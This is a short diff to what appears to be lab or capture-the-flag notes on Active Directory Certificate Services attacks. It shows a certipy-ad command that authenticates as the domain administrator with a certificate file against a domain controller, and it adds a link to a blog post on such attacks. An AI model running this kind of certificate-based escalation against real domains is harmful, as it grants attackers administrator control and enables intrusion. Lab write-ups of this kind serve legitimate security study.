@@ -157,3 +157,4 @@
 
     certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.244.30
    ```
+- try harder: https://seriotonctf.github.io/2024/06/26/ADCS-Attacks-with-Certipy/index.html
